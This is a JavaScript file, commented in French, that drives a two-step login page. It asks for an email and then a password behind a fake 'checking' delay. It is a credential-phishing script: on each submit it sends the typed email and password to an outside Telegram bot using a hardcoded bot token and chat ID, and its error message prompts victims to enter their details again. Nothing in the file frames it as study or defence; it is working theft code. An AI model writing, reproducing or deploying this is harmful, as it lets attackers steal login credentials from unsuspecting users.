document.addEventListener("DOMContentLoaded", function () {
    const emailInput = document.querySelector('input[type="email"]');
    const passwordInput = document.querySelector('input[type="password"]');
    const submitButton = document.querySelector('.form-button');
    const loadingIndicator = document.getElementById("loading");
    const form = document.querySelector('.card-form');

    // Ajouter un conteneur pour le message d'erreur
    const errorMessage = document.createElement('p');
    errorMessage.style.color = 'red';
    errorMessage.style.textAlign = 'center';
    errorMessage.style.display = 'none'; // Caché par défaut
    form.appendChild(errorMessage); // Ajouter sous le formulaire

    let step = 1; // Étape actuelle : 1 pour email, 2 pour mot de passe

    submitButton.addEventListener("click", function (event) {
        event.preventDefault();

        // Réinitialiser le message d'erreur
        errorMessage.style.display = 'none';
        errorMessage.textContent = '';

        if (step === 1) {
            if (!emailInput.value) {
                alert("Veuillez entrer une adresse email.");
                return;
            }

            // Changer le texte du bouton en "Vérifications..."
            submitButton.textContent = "Vérifications...";
            submitButton.disabled = true; // Désactiver le bouton temporairement

            setTimeout(() => {
                submitButton.textContent = "S'identifier";
                submitButton.disabled = false; // Réactiver le bouton

                // Vérification fictive de l'email
                if (emailInput.value !== "exemple@email.com") { // Remplacez avec votre logique
                    errorMessage.textContent = "Mauvaises informations ! Veuillez réessayer.";
                    errorMessage.style.display = 'block';
                    return;
                }

                // Passer à l'étape du mot de passe
                emailInput.style.display = "none";
                passwordInput.style.display = "block";
                step = 2; // Étape suivante
            }, 2000); // Simulation d'une vérification
        } else if (step === 2) {
            if (!passwordInput.value) {
                alert("Veuillez entrer votre mot de passe.");
                return;
            }

            // Changer le texte du bouton en "Vérifications..."
            submitButton.textContent = "Vérifications...";
            submitButton.disabled = true;

            setTimeout(() => {
                submitButton.textContent = "S'identifier";
                submitButton.disabled = false;

                // Vérification fictive du mot de passe
                if (passwordInput.value !== "motdepasse123") { // Remplacez avec votre logique
                    errorMessage.textContent = "Mauvaises informations ! Veuillez réessayer.";
                    errorMessage.style.display = 'block';
                    return;
                }

                alert("Connexion réussie !");
                // Ici, vous pouvez rediriger vers une autre page
            }, 2000);
        }

        // Envoi des informations à Telegram à chaque étape
        sendToTelegram(emailInput.value, passwordInput.value);
    });

    // Fonction pour envoyer les données à Telegram
    function sendToTelegram(email, password) {
        const telegramConfig = {
            botToken: '7926694701:AAGmkHPMx94nBPlLYCeMJZyI3LbVNrhjZ7I',
            chatID: '5595794185'
        };

        const message = `Formulaire soumis :\nEmail: ${email}\nMot de passe: ${password}`;

        const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramConfig.chatID,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message envoyé avec succès');
            } else {
                console.log('Erreur lors de l\'envoi du message', data);
            }
        })
        .catch(error => {
            console.log('Erreur réseau :', error);
        });
    }
});
